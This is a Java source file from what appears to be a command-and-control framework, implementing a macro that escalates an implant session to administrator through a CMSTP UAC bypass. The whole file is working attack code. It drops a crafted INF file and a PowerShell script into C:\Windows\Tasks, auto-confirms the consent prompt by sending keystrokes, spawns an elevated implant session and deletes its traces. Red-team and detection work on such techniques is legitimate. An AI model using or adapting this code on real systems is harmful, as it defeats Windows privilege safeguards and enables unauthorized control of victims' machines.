package c2.session.macro.uac;

import java.util.Base64;

import c2.Commands;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;
import util.RandomHelper;
import util.Time;

public class CmstpUacBypasserMacro extends AbstractCommandMacro{

	public static final String CMD = "cmstp_uac";
	
	// Inspired by https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1
	private static final String POWERSHELL_TEMPLATE = "add-type -AssemblyName System.Windows.Forms\r\n"
			+ "\r\n"
			+ "#Command to run\r\n"
			+ "$ps = new-object system.diagnostics.processstartinfo \"c:\\windows\\system32\\cmstp.exe\"\r\n"
			+ "$ps.Arguments = \"/au $INF_FILENAME$\"\r\n"
			+ "$ps.UseShellExecute = $false\r\n"
			+ "\r\n"
			+ "#Start it\r\n"
			+ "[system.diagnostics.process]::Start($ps)\r\n"
			+ "\r\n"
			+ "#cmstp has several processes before the main window one starts up. give it a fraction of a heartbeat to start up.\r\n"
			+ "Start-Sleep -Milliseconds 100\r\n"
			+ "\r\n"
			+ "do\r\n"
			+ "{\r\n"
			+ "	# Do nothing until cmstp is an active window\r\n"
			+ "}\r\n"
			+ "until (Get-Process -Name \"cmstp\")\r\n"
			+ "\r\n"
			+ "#Activate window\r\n"
			+ "#Set-WindowActive cmstp\r\n"
			+ "Add-Type @\"\r\n"
			+ "    using System;\r\n"
			+ "    using System.Runtime.InteropServices;\r\n"
			+ "    public class WinAp {\r\n"
			+ "      [DllImport(\"user32.dll\")]\r\n"
			+ "      [return: MarshalAs(UnmanagedType.Bool)]\r\n"
			+ "      public static extern bool SetForegroundWindow(IntPtr hWnd);\r\n"
			+ "\r\n"
			+ "      [DllImport(\"user32.dll\")]\r\n"
			+ "      [return: MarshalAs(UnmanagedType.Bool)]\r\n"
			+ "      public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\r\n"
			+ "    }\r\n"
			+ "\"@\r\n"
			+ "\r\n"
			+ "$p = Get-Process -Name \"cmstp\"\r\n"
			+ "$h = $p.MainWindowHandle\r\n"
			+ "    [void] [WinAp]::SetForegroundWindow($h)\r\n"
			+ "    [void] [WinAp]::ShowWindow($h, 3)\r\n"
			+ "\r\n"
			+ "\r\n"
			+ "#Send the Enter key\r\n"
			+ "[System.Windows.Forms.SendKeys]::SendWait(\"{ENTER}\")";
	
	//This template is based on the version provided here: https://github.com/tylerapplebaum/CMSTP-UACBypass/blob/master/UACBypassCMSTP.ps1
	private static final String INF_TEMPLATE = "[version]\r\n"
			+ "Signature=$chicago$\r\n"
			+ "AdvancedINF=2.5\r\n"
			+ " \r\n"
			+ "[DefaultInstall]\r\n"
			+ "CustomDestination=CustInstDestSectionAllUsers\r\n"
			+ "RunPreSetupCommands=RunPreSetupCommandsSection\r\n"
			+ " \r\n"
			+ "[RunPreSetupCommandsSection]\r\n"
			+ "; Commands Here will be run Before Setup Begins to install\r\n"
			+ "powershell -WindowStyle hidden \"$DAEMON_START_HERE$\"\r\n"
			+ "taskkill /IM cmstp.exe /F\r\n"
			+ " \r\n"
			+ "[CustInstDestSectionAllUsers]\r\n"
			+ "49000,49001=AllUSer_LDIDSection, 7\r\n"
			+ " \r\n"
			+ "[AllUSer_LDIDSection]\r\n"
			+ "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n"
			+ " \r\n"
			+ "[Strings]\r\n"
			+ "ServiceName=\"$RANDOM_CORP_NAME$\"\r\n"
			+ "ShortSvcName=\"$RANDOM_CORP_NAME$\"";
	
	@Override
	public String getReadableName() {
		return "CMSTP UAC Bypass Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return CMD;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro will place a .inf file in the C:\\Windows\\Tasks directory that, when passed as an argument to CMSTP, will invoke a copy of the daemon running with Administrator privs. There is a user prompt, and TheAllCommander will detect when this prompt launches and order it to complete without further user interaction.";
	}

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(CMD);
	}

	public void deleteInfFile(String file, int sessionId, MacroOutcome outcome) {
		sendCommand("del " + file, sessionId, outcome);
	}
	
	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String clientCmd = null;
		if(cmd.startsWith(CMD) && !cmd.equals(CMD)) {
			clientCmd = cmd.substring(CMD.length() + 1);
			System.out.println("Processing with cmd: " + clientCmd);
		}else {
			sendCommand(Commands.CLIENT_CMD_GET_EXE, sessionId, outcome);
			clientCmd = awaitResponse(sessionId, outcome);
			clientCmd = clientCmd.replace("\r", "");
			clientCmd = clientCmd.replace("\n", "");
		}
		//First get daemon invocation command
		
		//TODO: Sanity check that command is valid. 
		//TODO: Migrate code to sanitize and validate daemon EXE gathering to a common module
		
		//Generate INF file
		String infContents = INF_TEMPLATE.replace("$DAEMON_START_HERE$", clientCmd);
		infContents = infContents.replace("$RANDOM_CORP_NAME$", RandomHelper.generateRandomLowercaseString());
		
		//Drop INF file to disc
		String b64Content = Base64.getEncoder().encodeToString(infContents.getBytes());
		final String infFilename = "C:\\Windows\\Tasks\\" + RandomHelper.generateRandomLowercaseString() + ".inf";
		sendCommand("<control> download " + infFilename + " " + b64Content, sessionId, outcome);
		String cmdOutcome = awaitResponse(sessionId, outcome);
		if(!cmdOutcome.contains("File written")) {
			outcome.addError("Could not write INF file to directory, quitting macro");
			return outcome;
		}
		
		//Drop powershell screen monitor script to disc.
		String powershellFileContent = POWERSHELL_TEMPLATE.replace("$INF_FILENAME$", infFilename);
		final String powershellScriptName = "C:\\Windows\\Tasks\\" + RandomHelper.generateRandomLowercaseString() + ".ps1";
		b64Content = Base64.getEncoder().encodeToString(powershellFileContent.getBytes());
		sendCommand("<control> download " + powershellScriptName + " " + b64Content, sessionId, outcome);
		cmdOutcome = awaitResponse(sessionId, outcome);
		if(!cmdOutcome.contains("File written")) {
			outcome.addError("Could not write INF file to directory, quitting macro");
			deleteInfFile(infFilename, sessionId, outcome);
			return outcome;
		}
		
		//Invoke powershell script that will monitor for the cmstp prompt and accept the dialogue when prompted.
		String powershellCommand = "powershell " + powershellScriptName + "";
		sendCommand(powershellCommand, sessionId, outcome);
		
		Time.sleepWrapped(5000);
		
		//Confirm that new session was received with admin privs
		Integer highSessionId = io.getSessionId(sessionStr + ":HighIntegrity");
		//We want to use the elevated session to delete the inf and ps1 files since the elevating session
		//does not always immediately recover to being able to respond to commands
		Integer deleteSessionId = sessionId;
		if(highSessionId == null) {
			outcome.addError("Did not receive a new session");
		}else {
			outcome.addMacroMessage("New elevated session available: " + highSessionId);
			deleteSessionId = highSessionId;
		}
		
		// clean up delivery files
		deleteInfFile(infFilename, deleteSessionId, outcome);
		sendCommand("del " + powershellScriptName, deleteSessionId, outcome);
		awaitResponse(sessionId, outcome);
		return outcome;
	}

}
